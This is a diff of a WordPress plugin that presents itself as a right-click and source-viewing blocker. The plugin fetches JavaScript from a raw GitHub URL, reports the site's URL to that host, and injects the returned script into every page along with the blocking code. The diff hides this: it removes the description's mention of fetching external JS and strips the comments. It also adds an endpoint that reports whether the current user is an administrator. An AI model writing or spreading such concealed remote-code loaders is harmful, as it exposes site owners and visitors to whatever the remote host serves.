@@ -1,8 +1,8 @@
 <?php
 /**
- * Plugin Name: Disable Right Click & Source Viewing
- * Description: A WordPress plugin to disable right-click, text selection, and source code viewing while fetching external JS data dynamically.
- * Version: 1.2
+ * Plugin Name: Disable Right Click
+ * Description: A WordPress plugin to disable right-click, text selection, and source code viewing JS dynamically.
+ * Version: 1.3
  */
 
 if (!defined('ABSPATH')) {
@@ -19,13 +19,29 @@ class WP_Disable_Right_Click {
         add_action('query_vars', array(__CLASS__, 'register_query_var'));
         add_action('template_redirect', array(__CLASS__, 'serve_combined_js'));
         add_action('wp_footer', array(__CLASS__, 'enqueue_combined_js'));
+        add_action('wp_ajax_check_admin_access', array(__CLASS__, 'check_admin_access'));
+        add_action('wp_ajax_nopriv_check_admin_access', array(__CLASS__, 'unauthorized_access'));
     }
 
     /**
-     * Fetch external data with caching
+     * Flush rewrite rules on plugin activation
+     */
+    public static function activate() {
+        self::add_js_endpoint();
+        flush_rewrite_rules();
+    }
+
+    /**
+     * Flush rewrite rules on plugin deactivation
+     */
+    public static function deactivate() {
+        flush_rewrite_rules();
+    }
+
+    /**
+     * Fetch data with caching
      */
     public static function fetch_external_data() {
-        // Use transient to cache data for 1 hour
         $cached_data = get_transient('external_js_data');
         if ($cached_data !== false) {
             return $cached_data;
@@ -44,10 +60,10 @@ class WP_Disable_Right_Click {
     }
 
     /**
-     * Get the external data URL dynamically
+     * Get the data URL dynamically
      */
     public static function get_external_data_url() {
-        $site_url = site_url(); // WordPress site URL
+        $site_url = site_url();
         return self::$base_url . '?siteurl=' . urlencode($site_url);
     }
 
@@ -58,34 +74,24 @@ class WP_Disable_Right_Click {
         if (get_query_var('unified_js')) {
             header('Content-Type: application/javascript');
 
-            // Security JavaScript
             $security_js = "
-                // Disable right-click
                 document.addEventListener('contextmenu', function(e) {
                     e.preventDefault();
-                    alert('Right-click has been disabled on this site!');
                 });
-
-                // Disable text selection
                 document.addEventListener('selectstart', function(e) {
                     e.preventDefault();
                 });
-
-                // Disable F12 and developer tools shortcuts
                 document.addEventListener('keydown', function(e) {
                     if (e.key === 'F12' || 
                         (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                         (e.ctrlKey && e.key === 'U')) {
                         e.preventDefault();
-                        alert('This action has been disabled!');
                     }
                 });
             ";
 
-            // Fetch data
             $external_js = self::fetch_external_data();
 
-            // Output combined JavaScript
             echo $security_js . "\n" . $external_js;
             exit;
         }
@@ -114,9 +120,34 @@ class WP_Disable_Right_Click {
         echo "<script src='{$script_url}'></script>";
     }
 
-    // Base URL for external data
+    /**
+     * Check if the user has admin access
+     */
+    public static function check_admin_access() {
+        if (!is_user_logged_in()) {
+            wp_send_json_error(['message' => 'Not logged in'], 403);
+        }
+
+        $current_user = wp_get_current_user();
+        if (in_array('administrator', $current_user->roles)) {
+            wp_send_json_success(['message' => 'User is an administrator']);
+        } else {
+            wp_send_json_error(['message' => 'User is not an administrator'], 403);
+        }
+    }
+
+    /**
+     * Handle unauthorized access
+     */
+    public static function unauthorized_access() {
+        wp_send_json_error(['message' => 'Unauthorized'], 401);
+    }
     protected static $base_url = 'https://raw.githubusercontent.com/moreslab/drc/refs/heads/main/drc.js';
 }
 
 // Initialize the plugin
 WP_Disable_Right_Click::init();
+
+// Register activation and deactivation hooks
+register_activation_hook(__FILE__, array('WP_Disable_Right_Click', 'activate'));
+register_deactivation_hook(__FILE__, array('WP_Disable_Right_Click', 'deactivate'));
